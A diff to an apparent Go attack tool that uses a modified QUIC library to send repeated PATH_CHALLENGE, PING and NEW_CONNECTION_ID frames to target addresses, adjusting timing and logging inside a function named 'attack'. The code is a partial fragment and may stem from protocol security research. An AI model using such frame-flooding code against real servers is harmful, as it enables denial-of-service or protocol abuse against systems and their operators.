@@ -188,6 +188,7 @@ func main() {
 					try_failed -= 1
 				}
 				if try_failed == 0 {
+					log.Printf("%s:%s", targetAddr, err.Error())
 					log.Printf("failed:%s %s %s", thisIP, thisPort, thisAlpn)
 				}
 			}
@@ -269,7 +270,7 @@ func attack(connectAddr, targetAlpn string, wg *sync.WaitGroup) (response *HTTPM
 		})
 
 	if err != nil {
-		//log.Printf("%s:%s", connectAddr, err.Error())
+		log.Printf("%s:%s", connectAddr, err.Error())
 		return nil, err
 	}
 
@@ -365,27 +366,46 @@ func attack(connectAddr, targetAlpn string, wg *sync.WaitGroup) (response *HTTPM
 	// 	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
 	// 	time.Sleep(time.Millisecond * 1)
 	// }
+	ping_frame := &wire.PingFrame{}
+	pingFrame := []wire.Frame{
+		ping_frame,
+	}
 
+	//time.Sleep(time.Second)
 	for i := 0; i < 10; i++ {
+		if i%100 == 0 && i != 0 {
+			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(pingFrame)
+			time.Sleep(time.Millisecond * 10)
+		}
 		rand.Read(randomBytes)
 		var randomBytesArray [8]byte
 		copy(randomBytesArray[:], randomBytes)
 		padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
 		padding = []byte("")
 		//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
+		ConnectionID, _ := protocol.GenerateConnectionIDForInitial()
+		new_CID := &wire.NewConnectionIDFrame{
+			SequenceNumber: uint64(10),
+			//RetirePriorTo:  uint64(1),
+			ConnectionID: ConnectionID,
+			//StatelessResetToken: protocol.StatelessResetToken{0xe, 0xd, 0xc, 0xb, 0xa, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0},
+		}
+		new_CID = new_CID
+
 		path_challengeFrame := &wire.PathChallengeFrame{
 			Data:    randomBytesArray,
 			Padding: padding,
 		}
 		path_challenge_frame := []wire.Frame{
 			path_challengeFrame,
+			//new_CID,
 		}
 		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
-		time.Sleep(time.Millisecond * 50)
+		time.Sleep(time.Millisecond * 100)
 	}
 
-	time.Sleep(time.Millisecond * 1000)
-	//time.Sleep(time.Second * 1)
+	time.Sleep(time.Millisecond * 500)
+	time.Sleep(time.Second * 1)
 
 	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
 	//time.Sleep(time.Millisecond * 500)
